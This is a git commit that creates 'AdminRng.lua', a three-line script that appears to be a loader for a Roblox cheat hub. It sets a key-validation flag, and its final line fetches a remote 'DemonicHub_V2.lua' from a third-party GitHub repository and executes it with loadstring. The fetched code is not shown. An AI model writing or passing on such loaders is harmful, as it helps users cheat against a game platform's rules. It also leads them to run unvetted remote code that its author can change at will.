d68f704fb3d9efb81965a02fc3caff42b474a3cd
Asi <148603975+SuperBlueEyeBall@users.noreply.github.com>
2024-07-12 14:02:23 -0500

    Create AdminRng.lua

---
+++ AdminRng.lua
@@ -0,0 +1,3 @@
+getgenv().ValidateType = "Key" 
+-- You can use "Whitelist" too! + pls don't remove nothing from this script or it can have errors. 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Prosexy/Demonic-HUB-V2/main/DemonicHub_V2.lua", true))()
